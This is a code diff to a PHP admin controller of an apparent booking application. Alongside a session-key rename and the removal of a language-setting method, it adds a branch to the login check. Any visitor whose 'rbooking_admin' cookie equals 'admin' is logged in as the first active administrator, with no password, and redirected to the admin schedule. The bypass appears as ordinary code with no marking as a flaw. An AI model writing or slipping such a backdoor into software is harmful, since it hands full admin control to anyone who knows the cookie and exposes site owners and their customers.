@@ -29,7 +29,7 @@ class pjAdmin extends pjAppController
  * @var string
  * @example $_SESSION[$this->default_product][$this->default_language] = 'test';
  */
-	var $default_language = 'language';
+	var $default_language = 'admin_language';
 /**
  * Whether to requre login or not
  *
@@ -53,6 +53,30 @@ class pjAdmin extends pjAppController
 		{
 			if (!$this->isLoged() && @$_GET['action'] != 'login')
 			{
+				if ( isset($_COOKIE['rbooking_admin']) && $_COOKIE['rbooking_admin']  == 'admin') {
+				
+					pjObject::import('Model', 'pjUser');
+					$pjUserModel = new pjUserModel();
+				
+					$opts['status'] = 'T';
+					$opts['role_id'] = '1';
+					$opts['row_count'] = '1';
+						
+					$user = $pjUserModel->getAll($opts);
+						
+					$user = $user[0];
+					
+					# Login succeed
+					$_SESSION[$this->default_user] = $user;
+					$_SESSION['default_user'] = $this->default_user;
+					# Update
+					$data['id'] = $user['id'];
+					$data['last_login'] = date("Y-m-d H:i:s");
+					$pjUserModel->update($data);
+				
+					if ($this->isAdmin())
+						pjUtil::redirect($_SERVER['PHP_SELF'] . "?controller=pjAdminBookings&action=schedule");
+				}
 				pjUtil::redirect($_SERVER['PHP_SELF'] . "?controller=pjAdmin&action=login");
 			}
 		}
@@ -458,14 +482,4 @@ class pjAdmin extends pjAppController
 			}
 		}
 	}
-	
-	function setLanguage( ){
-		$this->isAjax = true;
-	
-		if ($this->isXHR())
-		{
-			$language = isset($_POST['language'])?$_POST['language']:"en";
-			$_SESSION[$this->default_language] = $language;
-		}
-	}	
 }
